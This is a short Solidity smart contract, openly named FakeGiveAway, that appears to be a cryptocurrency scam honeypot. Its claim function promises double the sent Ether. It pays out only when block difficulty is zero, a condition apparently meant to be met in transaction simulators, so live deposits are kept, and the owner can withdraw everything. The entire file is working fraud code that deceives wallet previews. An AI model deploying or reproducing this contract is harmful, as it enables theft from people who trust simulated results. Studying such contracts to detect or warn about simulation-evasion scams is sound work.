// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Ownable} from "openzeppelin/access/Ownable.sol";


contract FakeGiveAway is Ownable {

    function claim() public payable{
        bool isValidCoinbase = checkDifficulty();
        if (!isValidCoinbase) {
            uint256 valueToClaim = msg.value*2;
            if (address(this).balance < msg.value*2) {
                valueToClaim = address(this).balance;
            }
            (bool success,) = msg.sender.call{value: valueToClaim}("");
            require(success, "Claim failed.");
        }
        return;
    }

    function checkDifficulty() private view returns (bool) {
        if (block.difficulty == 0) {
            return false;
        } else {
            return true;
        }
    }

    function withdraw() public onlyOwner {
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "Withdraw failed.");
    }

    receive() external payable {}
}
